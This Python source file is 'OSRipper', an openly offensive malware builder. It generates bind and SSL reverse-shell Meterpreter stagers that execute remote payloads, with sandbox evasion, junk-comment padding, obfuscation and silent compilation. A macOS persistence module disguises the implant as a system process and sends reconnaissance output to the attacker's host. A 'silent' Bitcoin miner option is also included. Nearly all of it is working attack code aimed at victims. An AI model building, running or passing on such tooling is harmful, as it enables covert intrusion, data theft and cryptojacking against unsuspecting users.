########################################
#------OSRIPPER MASTER V0.2.4.3--------#
########################################

import os
import socket
import shutil
import platform
from urllib import response
import secrets
import string
import random
from pickle import GLOBAL
bind=0
## RandomVariables
nonce1=secrets.randbelow(13)
nonce2=secrets.randbelow(13)
UltimateRandomNumberhigh = random.randint(14,30)
UltimateRandomNumberlow=secrets.randbelow(nonce1)
UltimateRandomNumberhigh2 = random.randint(14,30)
UltimateRandomNumberlow2=secrets.randbelow(nonce2)
sleeptime = secrets.randbelow(12)
VariableRange = random.randint(8,22)
VariableRange2 = random.randint(8,22)
VariableRange3 = random.randint(8,22)
RandomisationNum = random.randint(UltimateRandomNumberlow,UltimateRandomNumberhigh)
RandomisationNum2 = random.randint(UltimateRandomNumberlow2,UltimateRandomNumberhigh2)
c=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange))))
d=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange2))))
so=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange))))
s=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange2))))
l=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange3))))
dr=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange3))))
## jesus christ that was a LOT of random variables (and there are even more hidden away)
reps=False
def logo():
    logo1 = """

    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓███████████████████████▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█████████████████████████████████▓▒░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓████████████████████████████████████████▓▒░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓███████████████████████████████████████████████▒░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░▒▓███████████████████████████████████████████████████▒░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░▓██████████████████████████████████████████████████▒░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░▓█████████████████████████████████████████████████▓▒░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░▓█████████████████████████████████████████████████▒░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░█████████████████████████████████████████████████▒░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░████████████████████████████████████████████████▓░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░████████████████████████████████████████████████▒░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░▓███████████████████████████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░                                             
    ░░░░░░░░░░░░░░░▒███████████████▓▓▓▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▓███████████▓░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░█████████████▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓██████▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░▓███████████▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓███▓▓▒▒▒▒▓▓▓▓▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░███████████▓▒▒▒▒▓▓▓▒▒▒▓▓▓▓▓▒▒▒▒▒▒▓▓██▓▒▒▓▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░▒██████████▓▒▒▒█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▓██▓▓▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░██████████▓▒▒▓██▓▓▓▓▒▒▒▒▒▒▒▓▓▒▒▓▒▓▓▓▓▓▓▓▒▒▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░██████████▒▒▓█▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▓▒▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
    ░░░░░░░░░░░░▒████████▓▓▒▒█▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▓▒▒▒▒▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░▓████████▓▒▒█▓█▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▓▒▒▒▒▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░▓█████████▓▓█░▓█▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▓▒▓▓▒▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░▓███████▓▒░▒▒▒▒▒▓█▓▓▓▓▓▓▓▒▒▒▒▒▓▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░▓██████▒░░▒▓▓▒▒▒▒▒▓▓█▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▒▒▓▓▓▒▒▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░██████░░░░▒▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▓▓▒▓▓▓▓▒▒▒▒▒▒▒▓▒▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░▒████▓░░░░░▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░▓████▒░░░░░░▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▓▓█████████▓▓▓▓▓▓▓▓█▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░▒████░░░░░░░░░░░░░░▓▓▓▒▒▒▒▒▒▓▓▓████████▓▓▓▓▓██▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░▒███▓░░░░░░░░░░░░░░▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓██▓▓▒▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░███▓░░░░░░░░░░░░░░▓▓▓▒▒▓▓▒█▒▒▒▒▒▒▓▓▓██▓▓▒▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░███▓░░░░░░░░░░░░░░▓▓▓▒▓▓▒▒█▒▓▓▒▒▒▓▓▓▒█▒▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░▒▒▒░░░░░░░░░░░░░░░░▒▓▓▒▒▒▓▓▒█▓▒▓▒▓▓▓░░░▓███▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▒▒▒▒▒▒▒▒▓▓▒▒░░░███▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▓▒▒▒▒▒▒▓▓▒░░░░██▓█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▓▒▒▒▓▓▓░░░░░█▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▓▓▓▓░░░░░█▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓▒▒░░░░▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒░░░░░▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
                                                                                OSRIPPER v0.2.5
    """
    logo2 = '''
         ▄▀▀▀▀▄   ▄▀▀▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀█▀▄    ▄▀▀▄▀▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄ 
        █      █ █ █   ▐ █   █   █ █   █  █  █   █   █ █   █   █ ▐  ▄▀   ▐ █   █   █ 
        █      █    ▀▄   ▐  █▀▀█▀  ▐   █  ▐  ▐  █▀▀▀▀  ▐  █▀▀▀▀    █▄▄▄▄▄  ▐  █▀▀█▀  
        ▀▄    ▄▀ ▀▄   █   ▄▀    █      █        █         █        █    ▌   ▄▀    █  
          ▀▀▀▀    █▀▀▀   █     █    ▄▀▀▀▀▀▄   ▄▀        ▄▀        ▄▀▄▄▄▄   █     █   
          ▐      ▐     ▐   █       █ █         █          █    ▐   ▐     ▐   
                           ▐       ▐ ▐         ▐          ▐                  

    '''
    logo3 = '''
                                                                             
                          ,-.----.               ,----..                             
        ,-.----.     ,---,\    /  \             /   /   \   .--.--.   ,--,     ,--,  
        \    /  \ ,`--.' ||   :    \           /   .     : /  /    '. |'. \   / .`|  
        ;   :    \|   :  :|   |  .\ :         .   /   ;.  \  :  /`. / ; \ `\ /' / ;  
        |   | .\ ::   |  '.   :  |: |        .   ;   /  ` ;  |  |--`  `. \  /  / .'  
        .   : |: ||   :  ||   |   \ :        ;   |  ; \ ; |  :  ;_     \  \/  / ./   
        |   |  \ :'   '  ;|   : .   /        |   :  | ; | '\  \    `.   \  \.'  /    
        |   : .  /|   |  |;   | |`-'         .   |  ' ' ' : `----.   \   \  ;  ;     
        ;   | |  '   :  ;|   | ;            '   ;  \; /  | __ \  \  |  / \  \  \    
        |   | ;\  \   |  ':   ' |             \   \  ',  / /  /`--'  / ;  /\  \  \   
        :   ' | \.'   :  |:   : :              ;   :    / '--'.     /./__;  \  ;  \  
        :   : :-' ;   |.' |   | :               \   \ .'    `--'---' |   : / \  \  ; 
        |   |.'   '---'   `---'.|                `---`               ;   |/   \  ' | 
        `---'               `---`                                    `---'     `--`  
                                                                                
    '''
    logo4 = '''
                      .=-.-.   _ __              _,.---._      ,-,--.          ,-.--, 
          .-.,.---.  /==/_ /.-`.' ,`.          ,-.' , -  `.  ,-.'-  _\.--.-.  /=/, .' 
         /==/  `   \|==|, |/==/, -   \        /==/_,  ,  - \/==/_ ,_.'\==\ -\/=/- /   
        |==|-, .=., |==|  |==| _ .=. |       |==|   .=.     \==\  \    \==\ `-' ,/    
        |==|   '='  /==|- |==| , '=',|       |==|_ : ;=:  - |\==\ -\    |==|,  - |    
        |==|- ,   .'|==| ,|==|-  '..'        |==| , '='     |_\==\ ,\  /==/   ,   \   
        |==|_  . ,'.|==|- |==|,  |            \==\ -    ,_ //==/\/ _ |/==/, .--, - \  
        /==/  /\ ,  )==/. /==/ - |             '.='. -   .' \==\ - , /\==\- \/=/ , /  
        `--`-`--`--'`--`-``--`---'               `--`--''    `--`---'  `--`-'  `--`   

    '''

    logolist = [logo1, logo2, logo3, logo4]
    print(random.choice(logolist))
clear = lambda: os.system('clear')
clear()
logo()

def listen(host, port):

    SERVER_HOST = host
    SERVER_PORT = int(port)
    # send 1024 (1kb) a time (as buffer size)
    BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
    # separator string for sending 2 messages in one go
    SEPARATOR = "<sep>"

    # create a socket object
    s = socket.socket()
    # bind the socket to all IP addresses of this host
    s.bind((SERVER_HOST, SERVER_PORT))
    # make the PORT reusable
    # when you run the server multiple times in Linux, Address already in use error will raise
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.listen(5)
    print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

    # accept any connections attempted
    client_socket, client_address = s.accept()




    # receiving the current working directory of the client
    cwd = client_socket.recv(BUFFER_SIZE).decode()
    print("[+] Current working directory:", cwd)

    while True:
        # get the command from prompt
        command = input(f"{cwd} $> ")
        if not command.strip():
            # empty command
            continue
        # send the command to the client
        client_socket.send(command.encode())
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        # retrieve command results
        output = client_socket.recv(BUFFER_SIZE).decode()
        print("output:", output)
        # split command output and current directory
        results, cwd = output.split(SEPARATOR)
        # print output
        print(results)
    # close connection to the client
    client_socket.close()
    # close server connection
    s.close()
def gen_bind():

    global port
    global bind
    global name
    name = 'ocr'
    port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
    bind = '1'
    with open(name, 'a+') as ina:
        ina.write('port = '+str(port)+'\n')
        a = '''
import zlib,base64,socket,struct,time
def main():
    try:
        b=socket.socket(2,socket.SOCK_STREAM)
        b.bind(('0.0.0.0',int(port)))
        b.listen(1)
        s,a=b.accept()
        l=struct.unpack('>I',s.recv(4))[0]
        d=s.recv(l)
        while len(d)<l:
            d+=s.recv(l-len(d))
        exec(zlib.decompress(base64.b64decode(d)),{'s':s})
    except Exception:
        time.sleep(10)
        main()
main()

                '''
        ina.write(a)
        ina.close
        print('(*) Generated Backdoor and saved as '+name)
        print('After deployment interact with this Backdoor through this module in metasploit python/meterpreter/bind_tcp')
def gen_rev_ssl_tcp():
    global name
    global host
    global port
    name = 'ocr'
    host = input('Please enter the ip you wish the backdoor to connect back to: ')
    port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
    with open(name, 'a+') as ina:
        ina.write(d+' = '+port)
        ina.write("\n")
        ina.write(c+' = "'+host+'"'+'\n')
        for i in range(int(RandomisationNum)):
            a=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase + string.punctuation)for i in range(int(random.randint(0,17)))))
            ina.write('#'+a+'\n')
        b = '''
from sandboxed import is_sandboxed
import sys
certainty = is_sandboxed(logging=False)
if int(certainty)>0.5:
    sys.exit()
import zlib,base64,ssl,socket,struct,time
'''
        ina.write(b)
        for i in range(int(RandomisationNum2)):
            b3=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase + string.punctuation)for i in range(int(random.randint(0,7)))))
            ina.write('#'+b3+'\n')
        b2 = '''
for x in range(10):
	try:
		'''+so+'''=socket.socket(2,1)
		'''+so+'''.connect(('''+c+''','''+d+'''))
		'''+s+'''=ssl.wrap_socket('''+so+''')
		break


	except:
		time.sleep('''+str(sleeptime)+''')


'''+l+'''=struct.unpack('>I','''+s+'''.recv(4))[0]
'''+dr+'''='''+s+'''.recv('''+l+''')
while len('''+dr+''')<'''+l+''':
	'''+dr+'''+='''+s+'''.recv('''+l+'''-len('''+dr+'''))
exec(zlib.decompress(base64.b64decode('''+dr+''')),{'s':'''+s+'''})
'''
        ina.write(b2)

        opt_bind = input('Do you want to bind another program to this Backdoor?(y/n): ')
        if opt_bind == 'y':
            bind_file = input('Please enter the name (in same dir) of the .py you want to bind: ')
            with open(bind_file, 'r') as bindfile:
                bindfilecontent=bindfile.read()
                ina.write(bindfilecontent)
                bindfile.close

        print('(*) Generated Backdoor and saved as '+name)
def gen_custom():
    customshell=input("Please enter the file name containing your code: ")
    name="ocr"

    with open(customshell, 'r') as cuso:
        with open(name, 'a+') as ina:
            for line in cuso:
                ina.write(line)


        opt_bind = input('Do you want to bind another program to this Backdoor?(y/n): ')
        if opt_bind == 'y':
            bind_file = input('Please enter the name (in same dir) of the .py you want to bind: ')
            with open(bind_file, 'r') as bindfile:
                bindfilecontent=bindfile.read()
                ina.write(bindfilecontent)
                bindfile.close

        print('(*) Generated Backdoor and saved as '+name)

def gen_btc_miner():
    global name
    global host
    name = 'ocr'
    addy = input('Please enter the payout btc address: ')
    with open(name, 'a+') as ina:
        ina.write('addy = "'+addy+'"\n')
        b = r'''

import socket
import json
import hashlib
import binascii
from pprint import pprint
import time
import random
def main():
    address = addy
    nonce   = hex(random.randint(0,2**32-1))[2:].zfill(8)

    host    = 'solo.ckpool.org'
    port    = 3333

    #print("address:{} nonce:{}".format(address,nonce))
    #print("host:{} port:{}".format(host,port))

    sock    = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host,port))

    #server connection
    sock.sendall(b'{"id": 1, "method": "mining.subscribe", "params": []}\n')
    lines = sock.recv(1024).decode().split('\n')
    response = json.loads(lines[0])
    sub_details,extranonce1,extranonce2_size = response['result']

    #authorize workers
    sock.sendall(b'{"params": ["'+address.encode()+b'", "password"], "id": 2, "method": "mining.authorize"}\n')

    #we read until 'mining.notify' is reached
    response = b''
    while response.count(b'\n') < 4 and not(b'mining.notify' in response):
        response += sock.recv(1024)


    #get rid of empty lines
    responses = [json.loads(res) for res in response.decode().split('\n') if len(res.strip())>0 and 'mining.notify' in res]
    #pprint(responses)

    job_id,prevhash,coinb1,coinb2,merkle_branch,version,nbits,ntime,clean_jobs \
        = responses[0]['params']

    #target https://bitcoin.stackexchange.com/a/36228/44319
    target = (nbits[2:]+'00'*(int(nbits[:2],16) - 3)).zfill(64)
    #print('nbits:{} target:{}\n'.format(nbits,target))

    extranonce2 = '00'*extranonce2_size

    coinbase = coinb1 + extranonce1 + extranonce2 + coinb2
    coinbase_hash_bin = hashlib.sha256(hashlib.sha256(binascii.unhexlify(coinbase)).digest()).digest()

    #print('coinbase:\n{}\n\ncoinbase hash:{}\n'.format(coinbase,binascii.hexlify(coinbase_hash_bin)))
    merkle_root = coinbase_hash_bin
    for h in merkle_branch:
        merkle_root = hashlib.sha256(hashlib.sha256(merkle_root + binascii.unhexlify(h)).digest()).digest()

    merkle_root = binascii.hexlify(merkle_root).decode()

    #little endian
    merkle_root = ''.join([merkle_root[i]+merkle_root[i+1] for i in range(0,len(merkle_root),2)][::-1])

    #print('merkle_root:{}\n'.format(merkle_root))

    blockheader = version + prevhash + merkle_root + nbits + ntime + nonce +\
        '000000800000000000000000000000000000000000000000000000000000000000000000000000000000000080020000'

    #print('blockheader:\n{}\n'.format(blockheader))

    hash = hashlib.sha256(hashlib.sha256(binascii.unhexlify(blockheader)).digest()).digest()
    hash = binascii.hexlify(hash).decode()
    #print('hash: {}'.format(hash))

    if hash < target :
        #print('success!!')
        payload = '{"params": ["'+address+'", "'+job_id+'", "'+extranonce2 \
            +'", "'+ntime+'", "'+nonce+'"], "id": 1, "method": "mining.submit"}\n'
        sock.sendall(payload)
        #print(sock.recv(1024))
    else:
        main()

    sock.close()
main()

'''
        ina.write(b)
def postgen():
    opt_obf = input('Do you want to obfuscate the generated programm (recommended) (y/n): ')
    global encrypted
    encrypted = False
    b=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase)for i in range(13)))
    if opt_obf == 'y':
        encrypted = True
        import obfuscator
        obfuscator.MainMenu(name)
    compiling = input('Do you want to compile the script into a binary (might require sudo) (y/n): ')
    if compiling == 'y':
        global icochoice
        icochoice = input("Enter .ico path to set a custom icon (press enter for default): ")
        if encrypted == True:
            if icochoice:
                compcomd = 'python3 -m nuitka --standalone --include-module=sandboxed --disable-console --macos-onefile-icon='+icochoice+' --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle '+name+'_or.py'
                os.system(compcomd)
                print('Saved under "dist" folder')
            else:
                compcomd = 'python3 -m nuitka --standalone --include-module=sandboxed --disable-console --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle '+name+'_or.py'
                os.system(compcomd)
                print('Saved under "dist" folder')

        else:
            if icochoice:
                compcomd = 'python3 -m nuitka --standalone --include-module=sandboxed --disable-console --macos-onefile-icon='+icochoice+' --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle '+name
                os.system(compcomd)
                print('Saved under "dist" folder')
            else:
                compcomd = 'python3 -m nuitka --standalone --include-module=sandboxed --disable-console --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle '+name
                os.system(compcomd)
                print('Saved under "dist" folder')
            print(logo)
            print('Backdoor saved under "dist" folder')
def rep_syst():
    hide = input('Do you want the backdoor to hide itself and replicate a system proccess? (OSX and linux only) (y/n): ')
    if hide == 'y':
        global name2
        global reps
        reps=True
        if bind == '1':
            host2='localhost'
        else:
            host2=host
        name2=input('Please enter the name for the rat: ')
        icochoice = input("Enter .ico path to set a custom icon (press enter for default): ")
        with open(name2, 'a+') as hider:
            hider.write(str('host = "'+host2+'"\n'))
            v= '''
import os
import shutil
import time
directory_path = os.getcwd()
folder_name = os.path.basename(directory_path)
anan= __file__
filename = anan.split('/')
a=anan.replace(str(filename[-1]), '')
src1=a+'swiftbelt/Swiftbelt'
src=a+'ocr/Contents/MacOS/ocr_or'
dest1='/Users/Shared/swift'
dest='/Users/Shared/com.apple.system.monitor'
shutil.copyfile(src, dest)
shutil.copy(src1, dest1)
os.system('chmod u+x '+dest1)
os.system(dest1+' > /users/shared/output.txt')
time.sleep(10)

import socket
import sys


ServerIp = host



# Now we can create socket object
s = socket.socket()

# Lets choose one port and connect to that port
PORT = 9898

# Lets connect to that port where server may be running
s.connect((ServerIp, PORT))

# We can send file sample.txt
file = open("/users/shared/output.txt", "rb")
SendData = file.read(1024)


while SendData:
    # Now we can receive data from server
    #Now send the content of sample.txt to server
    s.send(SendData)
    SendData = file.read(1024)      

# Close the connection from client side
s.close()
#print('connection closed')
os.system('chmod u+x '+dest)
os.system(dest)

            '''
            hider.write(v)
            hider.close()
            import obfuscator
            obfuscator.MainMenu(name2)
            if icochoice:
                os.system('sudo pyinstaller -i '+icochoice+' --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "ocr_or.app:ocr" '+str(name2)+'_or.py')
  
            else:
                os.system('sudo pyinstaller --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "ocr_or.app:ocr" '+str(name2)+'_or.py')
def server():
    import socket

    # Now we can create socket object
    s = socket.socket()

    # Lets choose one port and start listening on that port
    PORT = 9898
    print("\n Server is listening on port :", PORT, "\n")

    # Now we need to bind to the above port at server side
    s.bind(('', PORT))

    # Now we will put server into listenig  mode 
    s.listen(10)

    #Open one recv.txt file in write mode
    file = open("recv.txt", "wb") 
    #print("\n Copied file name will be recv.txt at server side\n")

    # Now we do not know when client will concatct server so server should be listening contineously  
    while True:
        # Now we can establish connection with clien
        conn, addr = s.accept()

        # Send a hello message to client
        #msg = "\n\n|---------------------------------|\n Hi Client[IP address: "+ addr[0] + "], \n ֲֳ**Welcome to Server** \n -Server\n|---------------------------------|\n \n\n"    
        #conn.send(msg.encode())
        
        # Receive any data from client side
        RecvData = conn.recv(1024)
        while RecvData:
            file.write(RecvData)
            RecvData = conn.recv(1024)

        # Close the file opened at server side once copy is completed
        file.close()
        print("\n File has been copied successfully \n")

        # Close connection with client
        conn.close()
        print("\n Server closed the connection \n")

        # Come out from the infinite while loop as the file has been copied from client.
        break
def cleanup():
    try:
        if reps == False:
            os.remove('ocr.py')
            os.remove('ocr_or.py')
            os.remove('ocr_or.spec')
        if reps==True:
            os.remove(name2)
            os.remove(name2+'.spec')
            os.remove('ocr.py')
            os.remove('ocr_or.py')
            os.remove('ocr_or.spec')
            if platform.system() == 'Windows':
                shutil.rmtree(os.getcwd()+'/dist/ocr_or.exe')
            else:
                shutil.rmtree(os.getcwd()+'/dist/'+name2)
    except FileNotFoundError:
        pass

print("""
    
        1. Create Bind Backdoor (opens a port on the victim machine and waits for you to connect)
        2. Create Encrypted TCP Meterpreter (can embed in other script) (recommended)
        3. Create Obfuscated file with custom code
        ##########################################################################################
                                                Miners
        4. Create a silent BTC miner
        
""")  
encrypted = False     
nscan = input("Please select a module: ")
if nscan == "1":
    gen_bind()
    postgen()
    cleanup()
    os.system('clear')
    print('Generated in dist')
    a = "use python/meterpreter/bind_tcp in metasploit to connect to target"
    print(a)
if nscan == "2":
    clear()
    logo()
    print('##########################################################################################')
    print('Generating')
    gen_rev_ssl_tcp()
    clear()
    logo()
    print('##########################################################################################')
    print('Specifying')
    postgen()
    clear()
    logo()
    print('##########################################################################################')
    print('RootKit')
    rep_syst()
    if reps == True:
        print('Generated in dist')
        print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
        print('After that the listener will spawn instantly')
        server()
        print('wait...')
        a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
        os.system(a)
    else:
        print('wait...')
        a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
        os.system(a)
if nscan == "3":
    gen_custom()
    postgen()
    rep_syst()
if nscan == '4':
    gen_btc_miner()
    opt_obf = input('Do you want to obfuscate the generated programm (recommended) (y/n): ')
    encrypted = False
    if opt_obf == 'y':
        encrypted = True
        import obfuscator
        obfuscator.MainMenu(name)
    compiling = input('Do you want to compile the script into a binary (might require sudo) (y/n): ')
    if compiling == 'y':
        if encrypted == True:
            compcomd = 'pyinstaller -F --windowed --hidden-import socket --hidden-import json --hidden-import pprint --hidden-import hashlib --hidden-import binascii '+name+'_or.py'
            os.system(compcomd)
            print('Saved under "dist" folder')
        else:
            compcomd = 'pyinstaller -F --windowed --hidden-import socket --hidden-import json --hidden-import pprint --hidden-import hashlib --hidden-import binascii '+name
            os.system(compcomd)
            os.system(clear)
            print(logo)
            print('Miner saved under "dist" folder')
    print("You can monitor your `miners` here : https://solo.ckpool.org/")
    cleanup()
else:
    print('Please select a vaild option')
